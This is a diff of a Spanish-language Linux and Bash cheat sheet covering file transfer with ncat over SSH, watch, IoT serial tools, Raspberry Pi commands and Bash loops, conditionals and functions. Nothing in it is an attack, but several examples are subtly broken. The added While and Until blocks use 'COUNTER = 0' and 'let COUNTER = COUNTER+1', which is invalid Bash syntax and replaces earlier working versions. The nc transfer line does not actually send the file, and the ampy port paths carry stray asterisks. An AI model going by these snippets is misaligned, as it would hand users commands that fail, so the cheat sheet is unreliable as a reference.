-Enviar archivo via ncat por tunel ssh (Seguro)
-
+**Enviar archivo via ncat por tunel ssh (Seguro)**
 ```
 nc myDocument.pdf | ssh me.myserver.com nc -l -p 20000
 # cliente
 nc me.myserver.com 20000 > myDocument.pdf
 ```
 
-### Script al iniciar el sistema (boot).
-
-```
-sudo crontab -e
-# Add line to file (here a python script):
-@reboot python3 /home/pi/Desktop/exemple.py &
-```
-
-### Ejecutar un comando cada 2 segundos.
-
+**Ejecutar un comando cada 2 segundos.**
 ```
 watch ls
 ```
-
 Si desde otras ventana agregas unos archivos, podrás ver los cambios en ventana que ejecuta watch.
 
-### Crear tu propio comando.
-
-```
-sudo -i
-echo echo 'Hello World Linux' > mi-super-comando
-chmod +x mi-super-comando && cp mi-super-comando /usr/bin/
-mi-super-comando
-```
-
 ## IOT
-
-Dispositivos conectados USB por conexión serial. Ubicarlo es sencillo con:
-
+**Dispositivos conectados USB por conexión serial. Ubicarlo es sencillo con:**
 ```
 dmesg | grep ttyUSB
 ```
 
-Podemos usar rshell y repl para acceder al dispositivo
-
+**Podemos usar rshell y repl para acceder al dispositivo.**
 ```
 rshell -p /dev/ttyUSB && repl
 ```
 
-Para interactuar con el dispositivo, podemos usar:
-
+**Para interactuar con el dispositivo, podemos usar:**
 ```
- ampy --port /dev/ttyUSB** ls
- ampy --port /dev/ttyUSB** put archivo
- ampy --port /dev/ttyUSB** run archivo
- ampy --port /dev/ttyUSB** rm archivo
+ampy --port /dev/ttyUSB** ls
+ampy --port /dev/ttyUSB** put archivo
+ampy --port /dev/ttyUSB** run archivo
+ampy --port /dev/ttyUSB** rm archivo
 ```
 
-Temperatura CPU Raspberry Pi
-
+**Temperatura CPU Raspberry Pi.**
 ```
 /opt/vc/bin/vcgencmd measure_temp
 ```
 
-Controla el audio:
-
+**Controla el audio:**
 ```
 amixer scontrols
 ```
 
-Busca el dispositivo y ajustar el volumen
-
+**Busca el dispositivo y ajustar el volumen.**
 ```
 amixer sset 'PCM' 100%
 ```
 
-Cambiar el banner cuando accedemos al shell del servidor.
-
+**Cambiar el banner cuando accedemos al shell del servidor.**
 ```
 vim /etc/motd
 ```
 
 ## Programación (Bash Script)
 
-### Declarar variables:
+**Declarar variables:**
+```
+mivar="HOLA-MUNDO!"
+echo $mivar
+yes $mivar
+```
+**Leer input del usuario:**
+```
+read -p "Escríbeme un saludo: " -r saludos
+echo "$saludos para ti también"
+```
 
-          mivar="HOLA-MUNDO!!"
-          echo $mivar
-          yes $mivar
+**Aritmética**
+```
+echo $((((2+2-3)*3)/3))
+```
 
-### Leer input del usuario:
-
-          read -p "Escríbeme un saludo: " -r saludos
-          echo "$saludos para ti también"
-
-### For
-
-          for i in {1..10} ; do
-              echo "hola $i";
-          done
-
-
-            for i in $( ls ); do
-                echo item: $i;
-                sleep 1;
-            done
-
-
-            for i in `seq 1 10`; do
-                    echo $i
-            done    
-
-            for e in {0..9};do echo $e🍀; done;
-
-### While
-
-             COUNTER=0
-             while [  $COUNTER -lt 10 ]; do
-                 echo The counter is $COUNTER
-                 let COUNTER=COUNTER+1
-             done
-
-### Until
-
-             COUNTER=20
-             until [  $COUNTER -lt 10 ]; do
-                 echo COUNTER $COUNTER
-                 let COUNTER-=1
-             done
-
-### If
+**If**
 ```
 if [ hola == hola ]; then
    echo TRUE;
@@ -1621,17 +1471,49 @@ fi
 
 VAR="Hello Amit";
 if [[ $VAR == *Amit* ]];
-   then echo "its Amit";
-   else
-       echo "Its not Amit";
+    then echo "its Amit";
+else
+    echo "Its not Amit";
 fi
 ```
 
-### Aritmética
+**For**
 ```
-echo $((((2+2-3)*3)/3))
+for i in {1..10} ; do
+    echo "hola $i";
+done
+
+for i in $( ls ); do
+    echo item: $i;
+    sleep 1;
+done
+
+for i in `seq 1 10`; do
+    echo $i
+done
+
+for e in {0..9};do echo $e; done;
 ```
-### Funciones
+
+**While**
+```
+COUNTER = 0
+while [  $COUNTER -lt 10 ]; do
+    echo The counter is $COUNTER
+    let COUNTER = COUNTER+1
+done
+```
+
+**Until**
+```
+COUNTER = 20
+until [  $COUNTER -lt 10 ]; do
+    echo COUNTER $COUNTER
+    let COUNTER -= 1
+done
+```
+
+**Funciones**
 ```
 function chao {
  echo 'Chao amigo!';
@@ -1639,8 +1521,7 @@ function chao {
 }
 ```
 
-#### Como despedida ... salir, reiniciar, apagar en 30 min, apagar ahora, respectivamente.
-
+**Como despedida ... salir, reiniciar, apagar en 30 min, apagar ahora, respectivamente.**
 ```
 exit
 reboot
